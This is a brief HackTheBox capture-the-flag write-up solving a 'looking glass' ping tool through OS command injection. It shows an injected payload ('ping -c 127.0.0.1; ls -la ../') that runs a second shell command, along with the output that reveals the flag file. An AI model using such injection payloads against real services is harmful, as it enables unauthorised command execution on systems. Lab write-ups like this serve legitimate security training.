# looking glass

Completed: Yes
Platform: HackTheBox

Visited instance.

It supplies two opportunity: execute ping and traceroute. The first thing that comes on your mind have to be OS command injection.

Thus, I tried `ping with 1 packet and after that show me whoami`:

```bash
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.062 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.062/0.062/0.062/0.000 ms
www
```

It showed `www` user. Remains to find the flag.

```bash
ping -c 127.0.0.1; ls -la ../
total 88
drwxr-xr-x   1 root root 4096 Jul  7 09:00 .
drwxr-xr-x   1 root root 4096 Jul  7 09:00 ..
-rwxr-xr-x   1 root root    0 Jul  7 09:00 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  2  2020 bin
drwxr-xr-x   2 root root 4096 Sep 19  2020 boot
drwxr-xr-x   5 root root  360 Jul  7 09:00 dev
-rw-------   1 root root  127 Nov  2  2020 entrypoint.sh
drwxr-xr-x   1 root root 4096 Jul  7 09:00 etc
-rw-r--r--   1 root root   37 Nov  2  2020 flag_8UIGg
drwxr-xr-x   2 root root 4096 Sep 19  2020 home
drwxr-xr-x   1 root root 4096 Nov  2  2020 lib
drwxr-xr-x   2 root root 4096 Oct 12  2020 lib64
drwxr-xr-x   2 root root 4096 Oct 12  2020 media
drwxr-xr-x   2 root root 4096 Oct 12  2020 mnt
drwxr-xr-x   2 root root 4096 Oct 12  2020 opt
dr-xr-xr-x 429 root root    0 Jul  7 09:00 proc
drwx------   2 root root 4096 Oct 12  2020 root
drwxr-xr-x   1 root root 4096 Jul  7 09:00 run
drwxr-xr-x   1 root root 4096 Nov  2  2020 sbin
drwxr-xr-x   2 root root 4096 Oct 12  2020 srv
dr-xr-xr-x  13 root root    0 Jul  6 12:37 sys
drwxrwxrwt   1 root root 4096 Jul  7 09:00 tmp
drwxr-xr-x   1 root root 4096 Oct 12  2020 usr
drwxr-xr-x   1 root root 4096 Nov  2  2020 var
drwxr-xr-x   2 root root 4096 Nov  2  2020 www
```

`flag_8UIGg` is the flag.